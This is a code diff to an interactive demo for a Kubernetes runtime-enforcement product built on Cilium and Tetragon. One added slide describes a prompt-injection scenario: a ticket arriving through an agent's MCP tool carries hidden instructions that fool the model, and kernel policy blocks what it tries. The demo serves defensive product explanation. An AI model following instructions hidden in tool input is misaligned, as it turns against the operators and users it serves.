-   det:()=>`<h4>Agent profile (design)</h4><table><tr><td>model API</td><td class="g">declared + seen · allow</td></tr><tr><td>mcp-tickets:8080</td><td class="g">declared + seen · allow</td></tr><tr><td>tool search_kb</td><td class="y">declared, never used · tighten</td></tr><tr><td>paste.example.net</td><td class="x">never declared · a person decides</td></tr><tr><td>programs</td><td class="g">python only</td></tr></table><h4>Real cases</h4><p><a href="https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model" target="_blank" rel="noopener">Cohere: a model goes off-task ↗</a><br><a href="https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/" target="_blank" rel="noopener">JFrog: poisoned models on Hugging Face ↗</a></p>` },
- { ch:'Why now', t:'Every team will run agents.', tag:'agents · across the company', act:'Multiply',
-   p:()=>`Each agent has its own model, tools and data, and they change every week. Each one needs its own profile, kept current.`,
+   det:()=>`<h4>The rules that stop it</h4><table>${ATK.slice(1).map((a,i)=>`<tr><td>${i+2}. ${a[6]}</td><td>${a[7]}</td></tr>`).join('')}</table>` },
+ { ch:'Why now', t:'An agent can ignore its instructions. Not the kernel.',
+   p:()=>`support-agent has a model API, a ticket tool and a shell tool. Its profile comes from its own config.`,
+   init:()=>({n:0,sel:null,enf:true}), seq:AGA,
+   svg:s=>sceneA('agent',{steps:AGA.map((x,i)=>[x[0],x[1],x[2],x[3]==='a'?'b':x[3]]),n:s.n,fresh:s.n-1,enforced:true,label:'support-agent pod'}),
+   live:s=>s.n?seqLive(AGA,s):'A ticket arrives through its MCP tool. It contains hidden instructions.',
+   actl:s=>s.n===0?'Send the ticket':s.n<5?`Next step › ${s.n+1}`:'Done',
+   done:s=>s.n>=5, run:s=>{ s.n++; s.sel=null; },
+   end:s=>s.n>=5?'The model was fooled. <b>Nothing it tried left the pod.</b>':'',
+   det:()=>`<h4>Agent profile, from its config (design)</h4><table><tr><td>model API</td><td class="g">declared + seen · allow</td></tr><tr><td>mcp-tickets:8080</td><td class="g">declared + seen · allow</td></tr><tr><td>tool search_kb</td><td class="y">declared, never used · tighten</td></tr><tr><td>paste.example.net</td><td class="x">never declared · a person decides</td></tr><tr><td>programs</td><td class="g">python only</td></tr></table><h4>The honest limit</h4><p>Misuse through an allowed path (data inside a call to its own model API) is content. The gateway and guardrails catch that; the kernel catches actions.</p><h4>Real cases</h4><p><a href="https://cohere.com/blog/concerning-behaviour-popular-open-weight-ai-model" target="_blank" rel="noopener">Cohere: a model goes off-task ↗</a><br><a href="https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/" target="_blank" rel="noopener">JFrog: poisoned models on Hugging Face ↗</a></p>` },
+ { ch:'Why now', t:'Every team will run agents.',
+   p:()=>`Each agent has its own model, tools and data, and they change every week. Each needs its own profile, kept current.`,
    init:()=>({k:0}),
-   svg:s=>{ const L=[1,40,1000][s.k], cols=s.k===0?1:s.k===1?8:40, r=s.k===0?16:s.k===1?7:2.6, gap=s.k===0?0:s.k===1?22:7.6;
-     const n=Math.min(L,s.k===2?1000:L), rows=Math.ceil(n/cols), w=(cols-1)*gap, h=(rows-1)*gap, x0=180-w/2, y0=150-h/2;
-     let g=''; for(let i=0;i<n;i++){ const x=x0+(i%cols)*gap, y=y0+Math.floor(i/cols)*gap; g+=`<circle cx="${x}" cy="${y}" r="${r}" class="ag"/>`; }
-     return g+`<text x="180" y="${s.k===2?272:240}" text-anchor="middle" class="cnt">${L.toLocaleString('en-US')}</text><text x="180" y="${s.k===2?290:258}" text-anchor="middle" class="cntl">${['one agent','agents in one team','agents across the company'][s.k]}</text>`; },
-   live:s=>['One profile, written by hand: possible.','40 agents in one team: a full-time job.','<b>1,000 agents, changing weekly:</b> only a product can decide and keep it current.'][s.k],
-   actl:s=>s.k<2?['× 40','× 1,000'][s.k]:'Multiplied',
-   done:s=>s.k>=2, run:(s,re)=>{ if(s.k<2){ s.k++; re(); } },
+   svg:s=>{ const L=[1,40,1000][s.k], cols=[1,8,40][s.k], r=[22,8,2.7][s.k], gap=[0,24,7.8][s.k];
+     const rows=Math.ceil(L/cols), w=(cols-1)*gap, h=(rows-1)*gap, x0=180-w/2, y0=(s.k===2?120:118)-h/2;
+     let g=''; for(let i=0;i<L;i++){ const x=x0+(i%cols)*gap, y=y0+Math.floor(i/cols)*gap; g+=`<circle cx="${x}" cy="${y}" r="${r}" class="ag"/>`; }
+     if(s.k===0) g+=glyph('ai',180,118).replace(/class="gl"/g,'class="gl" style="stroke:#B392F0"');
+     return g+`<text x="180" y="244" text-anchor="middle" class="cnt">${L.toLocaleString('en-US')}</text><text x="180" y="264" text-anchor="middle" class="cntl">${['one agent','agents in one team','agents across the company'][s.k]}</text>`; },
+   live:s=>['One profile, written by hand: possible.','40 agents in one team: someone’s full-time job.','<b>1,000 agents, changing weekly.</b><small>Only a product can decide each profile and keep it current.</small>'][s.k],
+   actl:s=>s.k<2?['× 40','× 1,000'][s.k]:'Multiplied', done:s=>s.k>=2, run:s=>{ s.k++; },
    end:s=>'', det:null },
- { ch:'Vision', t:'The decision layer for runtime enforcement.', tag:'boutique · before → after', act:null, close:true,
-   p:()=>`Every cluster has the engines. <b>We make the decisions</b>: from evidence, proven first, kept current, for workloads and agents. Lab: network and programs today; files and agent profiles next.`,
+ { ch:'Vision', t:'The decision layer for runtime enforcement.', close:true,
+   p:()=>`Every cluster has the engines. <b>We make the decisions</b>: from evidence, proven first, kept current, for workloads and agents.`,
    init:()=>({}),
-   svg:s=>{ const N=APP; return NEED.map(([a,b])=>edge(N,a,b,'need')).join('')+pod('adservice pod',true)+nodes(N,{dim:['att','api','sh','root']}); },
-   live:s=>`<div class="tiles"><div><span>network paths</span><b><s>133</s><span class="g" style="display:inline;font:inherit">17</span></b></div><div><span>needed flows dropped</span><b class="g">0</b></div><div><span>programs (adservice)</span><b><s>any</s><span class="g" style="display:inline;font:inherit">8</span></b></div><div><span>flows replayed first</span><b>33,411</b></div></div>`,
-   done:()=>true, run:null, end:()=>'', det:()=>`<h4>What is real today</h4><p>The lab namespace (boutique, 12 workloads): evidence collection from manifests, Hubble and Tetragon; classification; CiliumNetworkPolicy generation; flow replay; staged enforcement with rollback; program allow-lists with exec replay.</p><h4>Design, next</h4><p>File and privilege profiles, agent profiles from agent config, more engines (KubeArmor, securityContext).</p>` }
+   svg:s=>sceneB({tint:'ok',need:true,podOn:true,chips:chipRow([['java ✓','ok'],['sh','b'],['curl','b']]),dim:['att','api']}),
+   live:s=>`<div class="tiles"><div><span>network paths</span><b><s>133</s><span class="g" style="font:inherit;display:inline">17</span></b></div><div><span>needed flows dropped</span><b class="g">0</b></div><div><span>programs (adservice)</span><b><s>any</s><span class="g" style="font:inherit;display:inline">8</span></b></div><div><span>flows replayed first</span><b>33,411</b></div></div>`,
+   actl:null, done:()=>true, run:null, end:()=>'<span style="font:600 12px var(--mono);color:var(--muted)">Lab today: network and programs on Cilium and Tetragon. Next: files, agent profiles.</span>',
+   det:()=>`<h4>What is real today</h4><p>Lab namespace boutique (12 workloads): evidence from manifests, Hubble and Tetragon; classification; CiliumNetworkPolicy generation; flow replay; staged enforcement with rollback; program allow-lists with exec replay.</p><h4>Design, next</h4><p>File profiles, agent profiles from agent config, more engines.</p>` }
 ];
-const MTR=[[0],[0],[0],[0],[0],null,[6],[6],[6],[6]];
 
 // ---------- engine
 let at=0, ST=[], watching=false;
-function meter(){ const st=STEPS[at], s=ST[at]; let n=0;
-  if(at===5) n=[0,1,2,3,6][s.k]; else if(at>5) n=6;
-  $('meter').className='meter'+(n>=6?' okm':''); $('meter').innerHTML=`<div>${[0,1,2,3,4,5,6].map(i=>`<span class="${i<n?'c':''}"></span>`).join('')}</div>${7-n}/7 open`; }
+function meter(){ const s=ST[at]; let n=0; if(at===5) n=[0,1,2,3,6][s.k]; else if(at>5) n=6;
+  $('meter').className='meter'+(n>=6?' okm':''); $('meter').innerHTML=`<div>${[0,1,2,3,4,5,6].map(i=>`<span class="${i<n?'c':''}"></span>`).join('')}</div>${7-n}/7 open`; $('meter').title=n>=6?'attack surface: files are next':'attack surface: 7 layers'; }
 function render(fade){
   const st=STEPS[at], s=ST[at];
   $('prog').innerHTML=STEPS.map((_,i)=>`<i class="${i<at?'d':i===at?'n':''}"></i>`).join('');
   $('chap').innerHTML=`<span>${st.ch}</span><em>${at+1} / ${STEPS.length}</em>`;
-  $('map').innerHTML=DEFS+st.svg(s); $('tag').textContent=st.tag; $('tagr').textContent='';
+  $('map').innerHTML=st.svg(s);
+  const tr=$('track'); if(st.seq){ const cnt=st.track?st.track(s):s.n; const fake={...s,n:cnt}; tr.innerHTML=trackHTML(st.seq,fake); tr.style.display=''; tr.querySelectorAll('[data-k]').forEach(b=>b.onclick=()=>{ s.sel=+b.dataset.k; render(); }); } else { tr.innerHTML=''; tr.style.display='none'; }
   if(fade){ $('stage').classList.remove('fade'); void $('stage').offsetWidth; $('stage').classList.add('fade'); }
   const lv=st.live(s), en=st.end?st.end(s):'';
   $('cap').innerHTML=`<h1>${st.t}</h1><p>${st.p()}</p>${lv?`<div class="live">${lv}</div>`:''}${en?`<p>${en}</p>`:''}<div class="spacer"></div>${st.det?`<button class="det" id="det">Details: the evidence ›</button>`:''}`;
   if($('det')) $('det').onclick=()=>sheet(st.t,st.det());
-  const a=$('act'); const label=st.act2&&st.act2(s)?st.act2(s):st.actl?st.actl(s):st.act;
-  a.style.display=st.act?'':'none'; a.textContent=label||''; a.disabled=!!s.run||(st.done(s)&&!(st.act2&&st.act2(s))&&!st.actl)||(st.actl&&st.done(s));
-  a.classList.toggle('go',!st.done(s)&&!watching);
+  const a=$('act'); a.style.display=st.actl?'':'none';
+  if(st.actl){ a.textContent=st.actl(s); a.disabled=(st.busy&&st.busy(s))||(st.done(s)&&!st.sticky)||(st.sticky&&st===STEPS[6]&&s.all)||(st.sticky&&st===STEPS[4]&&false); a.classList.toggle('go',!st.done(s)&&!watching); }
   $('back').disabled=at===0; $('next').textContent=at===STEPS.length-1?'Start over':'Next'; $('next').classList.toggle('go',st.done(s)&&!watching);
   $('modep').innerHTML=watching?`Playing · <button id="pause">Pause and explore</button>`:`<button id="play">▶ Play from here</button>`;
   if($('pause')) $('pause').onclick=()=>{ watching=false; stop(); render(); };
-  if($('play')) $('play').onclick=()=>{ watching=true; autoplay(); };
+  if($('play')) $('play').onclick=()=>{ watching=true; autoplay(); render(); };
   meter(); }
+function doAct(){ const st=STEPS[at], s=ST[at]; if(!st.run) return; st.run(s,()=>render()); render(); }
 function show(i,fade=true){ stop(); closeSheet(); at=i; ST[i]=STEPS[i].init(); render(fade); if(watching) autoplay(); }
-$('act').onclick=()=>{ const st=STEPS[at], s=ST[at]; if(!st.run) return; st.run(s,()=>render()); render(); };
-$('next').onclick=()=>{ if(at===STEPS.length-1){ watching=false; $('cover').hidden=false; return; } show(at+1); };
+$('act').onclick=()=>{ if(watching){ watching=false; stop(); } doAct(); };
+$('next').onclick=()=>{ if(at===STEPS.length-1){ watching=false; stop(); $('cover').hidden=false; return; } show(at+1); };
 $('back').onclick=()=>{ if(at>0) show(at-1); };
-// watch mode: each step plays its action, then moves on
-const PLAY={0:[[600,1],[7200,'n']],1:[[1500,1],[6500,'n']],2:[[800,1],[6200,'n']],3:[[1500,1],[6500,'n']],4:[[800,1],[3600,1],[7600,'n']],5:[[900,1],[2100,1],[3300,1],[4500,1],[6500,'n']],6:[[900,1],[3600,1],[8000,'n']],7:[[900,1],[8200,'n']],8:[[1200,1],[2900,1],[5500,'n']],9:[]};
-function autoplay(){ const plan=PLAY[at]||[]; plan.forEach(([ms,a])=>later(ms,()=>{ if(!watching) return; if(a==='n'){ if(at<STEPS.length-1) show(at+1); } else { const st=STEPS[at]; st.run&&st.run(ST[at],()=>render()); render(); } })); }
-// sheet
+// watch: [delay, 'a' = press the action, 'n' = next step]
+const W=(acts,gap,tail)=>{ const r=[]; let t=1400; for(let i=0;i<acts;i++){ r.push([t,'a']); t+=gap; } r.push([t+tail,'n']); return r; };
+const PLAY={0:W(6,3200,1500),1:W(1,3500,3500),2:W(4,2600,2000),3:W(2,3600,1500),4:[[1200,'a'],[5200,'a'],[9500,'n']],5:W(4,2200,1500),6:[[1200,'a'],[4200,'a'],[7600,'a'],[12500,'n']],7:W(5,3200,1800),8:W(2,2600,2500),9:[]};
+function autoplay(){ stop(); (PLAY[at]||[]).forEach(([ms,a])=>later(ms,()=>{ if(!watching) return; if(a==='n'){ if(at<STEPS.length-1) show(at+1); } else doAct(); })); }
 function sheet(t,h){ $('shT').textContent=t; $('shB').innerHTML=h; $('sheet').classList.add('on'); $('scrim').classList.add('on'); if(watching){ watching=false; stop(); render(); } }
 function closeSheet(){ $('sheet').classList.remove('on'); $('scrim').classList.remove('on'); }
 $('shX').onclick=closeSheet; $('scrim').onclick=closeSheet;
-// cover
-$('coverMap').innerHTML=DEFS+mesh(APP)+pod('adservice pod',false)+nodes(APP);
+$('coverMap').innerHTML=sceneA('app',{steps:[],n:0,label:'adservice pod'});
 $('watch').onclick=()=>{ $('cover').hidden=true; watching=true; show(0); };
 $('explore').onclick=()=>{ $('cover').hidden=true; watching=false; show(0); };
 ST=STEPS.map(s=>s.init()); render();
